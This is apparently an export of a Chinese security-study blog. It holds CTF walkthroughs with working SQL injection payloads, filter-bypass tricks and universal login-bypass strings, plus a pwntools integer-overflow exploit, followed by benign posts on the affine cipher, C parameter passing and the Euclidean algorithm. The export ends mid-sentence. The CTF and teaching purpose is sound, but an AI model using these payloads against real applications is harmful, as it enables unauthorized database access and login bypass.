1%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到The used SELECT statements have a different number ofcolumns（因为union前后的列数不相同） 再改payload为 admin_name=1” union select 1，2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 发现回显位置在Login_name那里 7、爆数据库名 admin_name=1” union select database(),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到bugkusql1 8、爆表名 admin_name=1” union select (select table_name from information_schema.tableswhere table_schema=database() limit 0,1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到flag1 改limit 0,1为limt 1,1 得到whoami 9、爆字段 admin_name=1” union select (select column_name from information_schema.columnswhere table_name=’flag1’),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到flag1 10、flag admin_name=1” union select (select flag1 fromflag1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到ed6b28e684817d9efcaf802979e57aea 备注 在admin_name或者admin_passwd 两处都可以进行爆破 最初尝试admin_name=1” union select1，2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO时没有看出来回显在1处，导致，再次尝试admin_name=1”union select 1，database()%23&amp;admin_passwd=1&amp;submit=GO+GO+GO时发现没有回显 用错误注入updatexml也可以得到数据库名，表名，字段名，但是爆flag时，因为flag太长，导致无法全部回显 0x02 bugku 多次很明显 注入点在id上 参数id只有5个，等于6的时候显示Error 测试1 id=1’ or 1=1# 返回错误，猜测可能有字符被过滤 测试2 id=1’ oorr 1=1–+ 返回正常结果，通过双写绕过 异或注入 id=1’^(length(‘被测试字符’)=0)–+ 例如：id=1’^(length(‘select’)=0)–+ 发现返回错误 因为select被过滤，那么length(‘’)就等于0，(length(‘’)=0)此等式成立，返回值为1，再和1异或结果为0，所以页面返回错误 检测出select、and 、or被过滤 注意：information中有一个or 同样道理，测试出过滤字符 select,union,and,or 可以采用双写绕过。测试payload： http://120.24.86.145:9004/1ndex.php?id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,2%23 页面结果 2 database: ?id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,database()%23 web1002-1 tables: 注意information里面有or，要双写过滤 ?id=-1’ ununionion seselectlect 1, group_concat(table_name) frominfoorrmation_schema.tables where table_schema=database() # 页面结果 flag1,hint columns: ?id=-1’ ununionion seselectlect 1, group_concat(column_name) frominfoorrmation_schema.columns where table_schema=database() ananddtable_name=’flag1’ %23 页面结果 flag1,address dump: ?id=-1’ ununionion seselectlect 1, group_concat(flag1) from flag1 %23 页面结果 usOwycTju+FTUUzXosjr ?id=-1’ ununionion seselectlect 1, group_concat(address) from flag1 %23 0x04 百度杯sql总结：用&lt;&gt;隔开敏感字符，绕过防注入 Order by 3与 union select 1，2，3都可以判断列数 输入and 1=1 发现被拦截 此外 测试了or 发现也进行了拦截 id=1 and 1=1 id=1 or 1=1 我们可以用下面的字符来替换 and 和 or and—-&gt;&amp;&amp; , or—–&gt; || id=1 &amp;&amp; 1=1 替换后发现可以成功绕过 接下来进行猜字段长度 发现order by 被拦截 id=1 order by 1 用&lt;&gt;把字符隔开，这里需要注意不要这样隔开or&lt;&gt;der,这样or又是一个被拦截的字符 然后利用二分法，才接触长度为3 id=1 o&lt;&gt;rder by 3 id=1 union se&lt;&gt;lect 1,2,3 在注入的时候select会被拦截，同样我们用&lt;&gt;把字符分开即可 界面出现2，我们就在2的位置进行注入 12345678id=1 union se&lt;&gt;lect 1,database(),3id=1 union se&lt;&gt;lect 1,table_name,3 from information_schema.tables where table_schema=&apos;sqli&apos;id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_schema=&apos;sqli&apos; an&lt;&gt;d table_name=&apos;info&apos;id=1 union se&lt;&gt;lect 1,flag,3 from info]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>SQL注入漏洞</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入总结]]></title>
    <url>%2F2019%2F10%2F20%2FSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x00 SQL注入原理与分类原理SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。 分类1按照参数类型可分为两种：数字型和字符型。当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。 2根据数据库返回的结果，分为回显注入、报错注入、盲注。 回显注入：可以直接在存在注入点的当前页面中获取返回结果。 报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。 盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。 3按照注入位置及方式不同分为：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入 0X01 注入常见参数user()：当前数据库用户 database()：当前数据库名 version()：当前使用的数据库版本 @@datadir：数据库存储数据路径 concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password) group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来 concat_ws()：用法类似 hex() 和 unhex()：用于 hex 编码解码 load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\ select xxoo into outfile &apos;路径&apos;：权限较高时可直接写文件0x02 后台万能密码admin&apos; -- admin&apos; # admin&apos;/* &apos; or 1=1-- &apos; or 1=1# &apos; or 1=1/* &apos;) or &apos;1&apos;=&apos;1-- &apos;) or (&apos;1&apos;=&apos;1-- 以不同的用户登陆 &apos; UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1--0x03 Mysql相关知识MySQL数据库的特有的表是 information_schema.tables , access数据库特有的表是 msysobjects 、SQLServer 数据库特有的表是 sysobjects 。那么，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库 12345678//判断是否是 Mysql数据库http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from information_schema.tables) # //判断是否是 access数据库http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from msysobjects) #//判断是否是 Sqlserver数据库http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from sysobjects) # 对于MySQL数据库，information_schema 数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。 mysql中注释符：# 、/**/ 、 –information_schema数据库中三个很重要的表：• information_schema.schemata: 该数据表存储了mysql数据库中的所有数据库的库名 • information_schema.tables： 该数据表存储了mysql数据库中的所有数据表的表名 • information_schema.columns: 该数据表存储了mysql数据库中的所有列的列名 常用函数ascii(str) : 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。如 ascii(“a”)=97 length(str) : 返回给定字符串的长度，如 length(“string”)=6 substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如 substr(“chinese”,3,2)=”in” substr()、stbstring()、mid() 三个函数的用法、功能均一致 concat(username)：将查询到的username连在一起，默认用逗号分隔 concat(str1,’‘,str2)：将字符串str1和str2的数据查询到一起，中间用连接group_concat(username) ：将username数据查询在一起，用逗号连接 limit 0,1：查询第1个数limit 1,1： 查询第2个数limit n,1： 查询第n+1个数 CONV(n,from_radix,to_radix)：用于将n从from_radix进制转到to_radix进制 0x04 判断是否存在SQL注入1.可以用网站漏洞扫描工具进行扫描，常见的网站漏洞扫描工具有 AWVS、AppScan、OWASP-ZAP、Nessus 等。 2.先加单引号、双引号、单括号、双括号等看看是否报错，如果报错就肯定存在SQL注入漏洞了。还有在URL后面加and 1=1 、 and 1=2看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。 0x05 获取数据库名12345SELECT database();SELECT schema_name FROM information_schema.schemata;id=1&apos; union select 1,database() #;admin_name=1&quot; union select database(),2%23;id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,database()%23; 0x06 获取表名1234union select table_name from information_schema.tables where table_schema=database(); admin_name=1&quot; union select (select table_name from information_schema.tables where table_schema=database() limit 0,1),2%23;union select 1,table_name from information_schema.tables where table_schema=&apos; &apos;;?id=-1&apos; ununionion seselectlect 1, group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() #; 0x07 获取列名12345union select group_concat(column_name) from information_schema.columns where table_name = &apos;tablename&apos;;admin_name=1&quot; union select (select column_name from information_schema.columns where table_name=&apos;flag1&apos;),2%23;?id=-1&apos; ununionion seselectlect 1, group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() anandd table_name=&apos;flag1&apos; %23;union select 1,column_name from information_schema.columns where table_schema=&apos; &apos; and table_name=&apos; &apos;;id=-1&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467# //这里需要用16进制绕过 0x08 查询结果123?id=-1&apos; ununionion seselectlect 1, group_concat(flag1) from flag1 %23；admin_name=1&quot; union select (select flag1 from flag1),2%23；d=-1&apos; union select 1,2,3,skctf_flag from fl4g#； 0x09 常用的绕过绕过引号限制1234567hex 编码select * from users where username = 0x61646D696Echar() 函数select * from users where username = char(97, 100, 109, 105, 110) 绕过字符串黑名单1234select &apos;a&apos; &apos;d&apos; &apos;mi&apos; &apos;n&apos;;select concat(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);select select_WS(&apos;&apos;, &apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);select group_concat(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;); 绕过逗号substr(),mid(),limit这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。 123456select substr(database(0 from 1 for 1);select mid(database(0 from 1 for 1);select * from news limit 0,1；# 等价于下面这条SQL语句select * from news limit 1 offset 0； 比较符(&lt;,&gt;)绕过使用二分查找的时候需要使用到比较操作符来进行查找。需要使用到greatest来进行绕过 1select * from users where id=1 and ascii(substr(database(),0,1))&gt;64； 如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。 1select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 0x10 常用sql语句1234567891011选择：select * from table1 where 范围 插入：insert into table1(field1,field2) values(value1,value2) 删除：delete from table1 where 范围 更新：update table1 set field1=value1 where 范围 查找：select * from table1 where field1 like &apos;%value1%&apos; 排序：select * from table1 order by field1,field2 [desc] 总数：select count as totalcount from table1 求和：select sum(field1) as sumvalue from table1 平均：select avg(field1) as avgvalue from table1 最大：select max(field1) as maxvalue from table1 最小：select min(field1) as minvalue from table1 1234567891011UNION 运算符 UNION 运算符通过组合其他两个结果表（例如 TABLE1 和 TABLE2）并消去表中任何重复行而派生 出一个结果表。当 ALL 随 UNION 一起使用时（即 UNION ALL），不消除重复行。两种情况下，派 生表的每一行不是来自 TABLE1 就是来自 TABLE2。 EXCEPT 运算符 EXCEPT 运算符通过包括所有在 TABLE1 中但不在 TABLE2 中的行并消除所有重复行而派生出一个 结果表。当 ALL 随 EXCEPT 一起使用时 (EXCEPT ALL)，不消除重复行。 INTERSECT 运算符 INTERSECT 运算符通过只包括 TABLE1 和 TABLE2 中都有的行并消除所有重复行而派生出一个结果 表。当 ALL 随 INTERSECT 一起使用时 (INTERSECT ALL)，不消除重复行。 注：使用运算词的几个查询结果行必须是一致的。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>SQL注入漏洞</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[仿射密码]]></title>
    <url>%2F2019%2F10%2F19%2F%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[0x01 算法原理仿射密码是一种表单代换密码，字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。 加密函数：E(x) = (ax + b) (mod m)，其中 a与b互质，m是编码系统中字母的个数（通常都是26）。 解密函数：D(x) = a^{-1} (x - b) (mod m)，其中 a^{-1} 是 a 在Z_{m}群的乘法逆元。 a,b是密钥，为满足0≤a,b≤25和gcd(a,26)等于1的整数。a-1表示a的逆元，即a-1*a ≡ 1mod26 0x02 算法实现（加密与解密）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define N 100int main()&#123; char m[N+1],c[N+1]; int k1,k2; printf(&quot;请输入原文:&quot;);//以回车（换行）作为字符串读取的结束,默认遇空格、回车、跳格键结束。 scanf(&quot;%[^\n]&quot;,m);//开始加密 printf(&quot;\n请输入密钥k1,k2:&quot;);//一次读取多个数值时的格式设置,默认以空格、回车分隔数值，若想以逗号分隔不同数值则需在&quot;&quot;内将格式设置为&quot;%d,%d&quot;，如scanf(&quot;%d,%d&quot;,&amp;k1,&amp;k2)则输入时仅以逗号分隔。 scanf(&quot;%d%d&quot;,&amp;k1,&amp;k2); for (int i=0;i&lt;strlen(m);i++) &#123;////&apos;a&apos;对应97,&apos;A&apos;对应65. 以下两式子等价 //c[i]=(m[i]-&apos;a&apos;+k2)%26+97;//c[i]=(m[i]-97+k2)%26+97; if(m[i]&gt;=&apos;A&apos;&amp;&amp;m[i]&lt;=&apos;Z&apos;) c[i]=&apos;A&apos;+(k1*(m[i]-&apos;A&apos;)+k2)%26; else if(m[i]&gt;=&apos;a&apos;&amp;&amp;m[i]&lt;=&apos;z&apos;) c[i]=&apos;a&apos;+(k1*(m[i]-&apos;a&apos;)+k2)%26; else c[i]=m[i]; //单字符输出每一个密文： &#125; printf(&quot;\n密文是: %s&quot;,c); int r0=26,t0=0,t1=1,r1=k1,r2,t2,q; while(r1!=0) &#123; q=r0/r1; r2=r0-q*r1; t2=t0-q*t1; r0=r1;r1=r2; t0=t1;t1=t2; &#125; int k1_inv=t0;//扩展欧几里得算法求逆元 printf(&quot;\n逆元 %d mod %d 是: %d&quot;,k1,r0,t0); for (int i=0;i&lt;strlen(c);i++) &#123; if(c[i]&gt;=&apos;A&apos;&amp;&amp;c[i]&lt;=&apos;Z&apos;) m[i]=&apos;A&apos;+(t0*(c[i]-&apos;A&apos;)-k2)%26; else if(c[i]&gt;=&apos;a&apos;&amp;&amp;c[i]&lt;=&apos;z&apos;) m[i]=&apos;a&apos;+(t0*(c[i]-&apos;a&apos;)-k2)%26; else m[i]=c[i]; &#125;//解密 printf(&quot;\n原文是: %s&quot;,m); &#125;]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>古典密码</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[整形溢出 int_overflow]]></title>
    <url>%2F2019%2F10%2F17%2F%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA-int_overflow%2F</url>
    <content type="text"><![CDATA[0x01 C语言的整数溢出机制整数溢出主要分为无符号整数溢出和有符号整数溢出。 无符号整型溢出对于unsigned整型溢出，C的规范是有定义的——“溢出后的数会以2^(8*sizeof(type))作模运算”，也就是说，如果一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模。 1234567#include &lt;stdio.h&gt;int main(int argc, const char * argv[]) &#123; // insert code here... unsigned char x; x = 128 + 130; printf(&quot;%d\n&quot;,x); &#125; 有符号整型溢出对于signed整型的溢出，C的规范定义是“undefined behavior”，虽然没有定义，各编译器可自己实现，但是大部分的溢出机制都是一样的。 有符号整型溢出又可分为向上溢出和向下溢出。假设用k个字节表示一个整型变量, 那么这个变量可以表示的有符号整数的范围是-2^(8k-1) ~ 2^(8k-1) – 1,那么两个正整数或者两个负整数相加就有可能超过这个整型变量所能表示的范围, 向上超出&gt;2^(8k-1) – 1我们称之为向上溢出, 向下超出&lt;-2^(8k-1), 我们称之为向下溢出.对于signed char,正整数最大值为127，负整数最小值为128。unsigned char所能表示的最大值为255。 12signed char x;x = 125 + 5; 上面代码会输出：-126，因为130的二进制位为10000010，符号为1，表示负数。对于有符号整型，负数是用补码表示的，即绝对值取反后加一。根据之前方法逆向回去，先减一后再取反得01111110，即126.所以10000010表示的是-126。 12signed char x;x = (-100) + (-100); 上面代码会输出56，因为200的二进制为11001000，-200根据补码的算法，得出00111000即56。上面的两个例子无论是向上溢出还是向下溢出，绝对值都在相对于无符号整型能表示的范围内。对于signed char如果结果为400，超出了位数表示范围，取结果的低八位。 12signed char x;x = 200 + 200; 因此上面代码会输出-112。如果x的结果为负数且超出了255，则取结果的低八位，并进行补码的反向操作，减一后取反。 数据类型范围• 2015/06/09Visual C++ 32 位和 64 位编译器可识别本文后面的表中的类型。 • int (unsigned int) • __int8 (unsigned __int8) • __int16 (unsigned __int16) • __int32 (unsigned __int32) • __int64 (unsigned __int64) • short (unsigned short) • long (unsigned long) • long long (unsigned long long)如果其名称以两个下划线 (__) 开始，则数据类型是非标准的。下表中指定的范围均包含起始值和结束值。 0x02 _int_overflow检查安全机制运行一下，我们知道这是一个创建用户名和密码的程序，对用户名的长度和密码都有限制。我们ctrl+1 找到了system（”cat flag”） 找到溢出点 strcpy：危险函数unsigned __int8最大只能到达255 可是我们read（。。。）远超过255。 利用思路整数溢出要想利用到strcpy这一步，要么你输入的passwd长度&gt;3 &amp;&amp; &lt;=8，要么使passwd的长度过长，而v3最大可以存的长度为255，所以直接在v3处造成整数溢出进入else，整数溢出需要255，返回地址需要4字节，所以passwd长度达到259即可第一种passwd太短，无法利用进行改写程序流，我们使用第二种思路。程序中存在，可以将返回地址指向what_is_this()。 1.发现v3是8位无符号整数，则最大只能是255。但是read函数能读取的长度是0x199，远大于255，那就可以进行整型溢出，让passwd的长度是 260到264就可以了。根据无符号整形溢出规则，溢出则进行2^(8*sizeof(type))作模运算，passwd的长度是 260到264。2.我们将程序的返回地址覆盖为system（”cat flag”） EXP:12345678910111213141516171819from pwn import*p = process(&apos;./int_overflow&apos;)system_flag_addr = 0x804868Bp.recvuntil(&apos;choice:&apos;)p.sendline(&quot;1&quot;)p.recvuntil(&apos;username:\n&apos;)p.sendline(&quot;tutu&quot;)p.recvuntil(&apos;passwd:\n&apos;)payload = &apos;A&apos;*0x18 + p32(system_flag_addr)payload = payload.ljust(262,&apos;A&apos;) p.sendline(payload)p.interactive() Python ljust()方法Python 字符串 Python 字符串描述Python ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>CTF PWN</tag>
        <tag>二进制漏洞</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C语言函数传参方式]]></title>
    <url>%2F2019%2F10%2F13%2FC%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[今天在写扩展欧几里得算法的C语言函数时在实参与形参的参数传递时出了一些问题，于是复习一下C语言传参的方式两种传参方式，值传递与地址传递 值传递这种方式使用变量、常量、数组元素作为函数参数，实际是将实参的值复制到形参相应的存储单元中，即形参和实参分别占用不同的存储单元，这种传递方式称为“参数的值传递”或者“函数的传值调用”。 值传递的特点是单向传递，即主调函数调用时给形参分配存储单元，把实参的值传递给形参，在调用结束后，形参的存储单元被释放，而形参值的任何变化都不会影响到实参的值，实参的存储单元仍保留并维持数值不变 例子： 12345678910111213141516171819#include &lt;stdio.h&gt;/* 变量x、y为Swap函数的形式参数 */void Swap(int x, int y)&#123; int tmp; tmp = x; x = y; y = tmp; printf("x = %d, y = %d\n", x, y);&#125;int main(void)&#123; int a=10; int b=20; /*变量a、b为Swap函数的实际参数*/ Swap(a, b); printf("a = %d, b = %d\n", a, b); return 0;&#125; 在上面这个示例代码中，实参将值传递给形参，形参值发生互换后的值不能回传给主调函数。因此，主调函数中的数值不变，代码的运行结果为： x = 20, y = 10a = 10, b = 20 函数在调用时，隐含地把实参 a 的值赋值给了参数 x，而将实参 b 的值赋值给了参数 y，如下面的代码所示 1234/*将a的值赋值给x（隐含动作）*/int x = a;/*将a的值赋值给y（隐含动作）*/int y = b; 因此，之后在 Swap() 函数体内再也没有对 a、b 进行任何操作。而在 Swap() 函数体内交换的只是 x、y，并不是 a、b，当然，a、b 的值没有改变。整个 Swap() 函数调用是按照如下顺序执行的： 123456789/*将a的值赋值给x（隐含动作）*/int x = a;/*将a的值赋值给y（隐含动作）*/int y = b;int tmp;tmp = x;x = y;y = tmp;printf("x = %d, y = %d\n", x, y); 由此可见，函数只是把 a、b 的值通过赋值传递给 x、y，在函数 Swap() 中操作的只是 x、y 的值，并不是 a、b 的值，这也就是所谓的参数的值传递。 地址传递这种方式使用数组名或者指针作为函数参数，传递的是该数组的首地址或指针的值，而形参接收到的是地址，即指向实参的存储单元，形参和实参占用相同的存储单元，这种传递方式称为“参数的地址传递”。 地址传递的特点是形参并不存在存储空间，编译系统不为形参数组分配内存。数组名或指针就是一组连续空间的首地址。因此在数组名或指针作函数参数时所进行的传送只是地址传送，形参在取得该首地址之后，与实参共同拥有一段内存空间，形参的变化也就是实参的变化。 12345678910111213141516void Swap(int *px, int *py)&#123; int tmp; tmp = *px; *px = *py; *py = tmp; printf(&quot;*px = %d, *py = %d\n&quot;, *px, *py);&#125;int main(void)&#123; int a=10; int b=20; Swap(&amp;a, &amp;b); printf(&quot;a = %d, b = %d\n&quot;, a, b); return 0;&#125; 在上面的示例代码中，函数 void Swap(intpx,intpy) 中的参数 px、py 都是指针类型，在 main 函数中使用语句“Swap(&amp;a,&amp;b)”进行调用，该调用语句将 a 的地址(&amp;a)代入 px，b 的地址(&amp;b)代入 py。很显然，这里的函数调用有两个隐含操作：将 &amp;a 的值赋值给参数 px，将 &amp;b 的值赋值给参数 py，如下面的代码所示： 12px = &amp;a;py = &amp;b; 这里与值传递方式存在着很大的区别。在值传递方式中，传递的是变量 a、b 的内容（即在上面的值传递示例代码中，将 a、b 的内容传递给参数 x、y）；而这里的地址传递方式则是将变量 a、b 的地址值（&amp;a、&amp;b）传递给参数 px、py。因此，整个 Swap() 函数调用是按照如下顺序执行的： 123456789/*将&amp;a的值赋值给px（隐含动作）*/px = &amp;a; /* ← *//*将&amp;b的值赋值给py（隐含动作）*/py = &amp;b;int tmp;tmp = *px;*px = *py;*py = tmp;printf(&quot;*px = %d, *py = %d\n&quot;, *px, *py); 这样，有了前两行的隐含赋值操作，指针变量 px、py 的值已经分别是变量 a、b 的地址值（&amp;a、&amp;b）。接下来，对“px”“py”的操作当然也就是对 a、b 变量本身的操作了。所以 Swap() 函数中的交换操作就是对 a、b 值进行交换，这就是所谓的地址传递，运行结果为：*px = 20, *py = 10a = 20, b = 10引用传递： 1234567891011121314void swap(int &amp;x,int &amp;y)&#123; int temp = x; x = y; y = temp;&#125;void main()&#123; int a = 10, b = 20; swap(a, b); printf(&quot;a=%d\nb=%d\n&quot;, a, b);&#125; 指针传递： 123456789101112131415void swap(int *x,int *y)&#123; int temp = *x; *x = *y; *y = temp;&#125;void main()&#123; int a = 10, b = 20; swap(&amp;a, &amp;b); printf(&quot;a=%d\nb=%d\n&quot;, a, b);&#125; 参考：http://c.biancheng.net/view/371.html]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[欧几里得算法与扩展欧几里得算法]]></title>
    <url>%2F2019%2F10%2F13%2F%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95%E4%B8%8E%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[欧几里得算法欧几里德算法又称辗转相除法，用于计算两个整数a,b的最大公约数。 基本算法：设a=qb+r，其中a，b，q，r都是整数，则gcd(a,b)=gcd(b,r)，即gcd(a,b)=gcd(b,a%b)。 证明第一种证明：a可以表示成a = kb + r，则r = a mod b 假设d是a,b的一个公约数，则有 d|a, d|b，而r = a - kb，因此d|r 因此d是(b,a mod b)的公约数 假设d 是(b,a mod b)的公约数，则 d | b , d |r ，但是a = kb +r 因此d也是(a,b)的公约数 因此(a,b)和(b,a mod b)的公约数是一样的，其最大公约数也必然相等，得证 第二种证明：要证欧几里德算法成立，即证: gcd(a,b)=gcd(b,r),其中 gcd是取最大公约数的意思，r=a mod b 下面证 gcd（a，b）=gcd（b，r）设 c是a，b的最大公约数，即c=gcd（a，b），则有 a=mc，b=nc，其中m，n为正整数，且m，n互为质数 由 r= a mod b可知，r= a- qb 其中，q是正整数， 则 r=a-qb=mc-qnc=（m-qn）c b=nc,r=(m-qn)c，且n，（m-qn）互质（假设n，m-qn不互质，则n=xd, m-qn=yd 其中x,y,d都是正整数，且d&gt;1 则a=mc=(qx+y)dc, b=xdc,这时a,b 的最大公约数变成dc，与前提矛盾， 所以n ，m-qn一定互质） 则gcd（b,r）=c=gcd（a,b） 得证。 算法实现1234567891011121314151617#include&lt;stdio.h&gt;int gcd(int i,int j)&#123;//定义求最大公因数的函数，有两个参数i,j是要求最大公因数的两个数 while(j!=0) &#123; int r=j; //定义r为中间变量，用于交换i,j的值 j=i%j; //求i,j的余数 i=r; &#125; //根据欧几里得算法，gcd(i,j)=gcd(j,i%j)，在j！=0的条件下循环计算 return i;&#125;int main()&#123; int i,j; printf(&quot;input i,j:&quot;); scanf(&quot;%d %d&quot;,&amp;i,&amp;j); printf(&quot;gcd of i,j is:%d&quot;,gcd(i,j)); return 0;&#125; 递归： 1234567int gcd(int a,int b)&#123; if(b==0) return a; return gcd(b,a%b);&#125; 扩展欧几里得算法基本算法：对于不完全为 0 的非负整数 a，b，gcd（a，b）表示 a，b 的最大公约数，必然存在整数对 x，y ，使得 gcd（a，b）=ax+by。 证明证明：设 a&gt;b。 1，显然当 b=0，gcd（a，b）=a。此时 x=1，y=0； 2，ab!=0 时 设 ax1+by1=gcd(a,b); bx2+(a mod b)y2=gcd(b,a mod b); 根据朴素的欧几里德原理有 gcd(a,b)=gcd(b,a mod b); 则:ax1+by1=bx2+(a mod b)y2; 即:ax1+by1=bx2+(a-(a/b)b)y2=ay2+bx2-(a/b)by2; 根据恒等定理得：x1=y2; y1=x2-(a/b)*y2; 这样我们就得到了求解 x1,y1 的方法：x1，y1 的值基于 x2，y2. 上面的思想是以递归定义的，因为 gcd 不断的递归求解一定会有个时候 b=0，所以递归可以结束。 当 b=0 时存在 x , y 为最后一组解，而每一组的解可根据后一组得到。所以第一组的解 x , y 必然存在 算法实现根据上面的证明，在实现的时候采用递归做法 先递归进入下一层，等到到达最后一层即 b=0 时就返回x=1 , y=0 再根据 x=y’ , y=x’-a/b/y’ ( x’ 与 y’ 为下一层的 x 与 y ) 得到当层的解 不断算出当层的解并返回，最终返回至第一层，得到原解 12345678910111213141516171819int exgcd(int m,int n,int &amp;x,int &amp;y)//扩展欧几里得算法&#123; int x1,y1,x0,y0; x0=1; y0=0; x1=0; y1=1; x=0; y=1; //初始化x0,y0,x1,y1 int r=m%n; //令r=i mod j int q=(m-r)/n; while(r) &#123; x=x0-q*x1; y=y0-q*y1; x0=x1; y0=y1; x1=x; y1=y; //x0=y1,y0=x1-(m/n)y1 m=n; n=r; r=m%n; q=(m-r)/n; &#125; return n;&#125; 递归： 1234567891011121314int exgcd(int a,int b,int &amp;x,int &amp;y)&#123; if(b==0) &#123; x=1; y=0; return a; &#125; int r=exgcd(b,a%b,x,y); int t=x; x=y; y=t-a/b*y; return r;&#125; 应用：（1）求解不定方程； （2）求解模线性方程（线性同余方程）； （3）求解模的逆元； 求解逆元1234567891011121314151617181920212223242526272829303132333435363738#include&lt;stdio.h&gt;int exgcd(int m,int n,int &amp;x,int &amp;y)//扩展欧几里得算法&#123; int x1,y1,x0,y0; x0=1; y0=0; x1=0; y1=1; x=0; y=1; //初始化x0,y0,x1,y1 int r=m%n; //令r=i mod j int q=(m-r)/n; while(r) &#123; x=x0-q*x1; y=y0-q*y1; x0=x1; y0=y1; x1=x; y1=y; //x0=y1,y0=x1-(m/n)y1 m=n; n=r; r=m%n; q=(m-r)/n; &#125; //可以求出x,y的值 return n;&#125;int mod_reverse(int a,int n)//ax=1(mod n) 求a的逆元x &#123; int d,x,y; d=exgcd(a,n,x,y); //调用扩展欧几里得算法求最大公因数 if(d==1) //如果做大公因数是1，gcd(a,n)=1则存在逆元 return (x%n+n)%n; //求a的逆相当于求解ax=1(mod n),这个方程可以转化为ax-my=1, //然后套用二元一次方程的方法，用扩展欧几里得算法求得一组x0,y0和gcd else return -1;&#125;int main()&#123; int i,j; printf(&quot;input a,n(ax=1(mod n)):&quot;) ; scanf(&quot;%d%d&quot;,&amp;i,&amp;j); printf(&quot;mod_reverse a is:%d&quot;,mod_reverse(i,j)); return 0;&#125; 求解不定方程exgcd 解不定方程（使用不将a与b转为互质的方法） 对于 ax+by=c 的不定方程，设 r=gcd(a,b) 当 c%r!=0 时无整数解 当 c%r=0 时，将方程右边 *r/c 后转换为 ax+by=r 的形式 可以根据扩展欧几里得算法求得一组整数解 x0 , y0 而这只是转换后的方程的解，原方程的一组解应再 *c/r 转变回去 （如 2x+4y=4 转换为 2x+4y=2 后应再将解得的 x , y 乘上2） 则原方程解为 x1=x0c/r , y1=x0c/r 通解 x=x1+b/rt , y=y1-a/rt ，其中 t 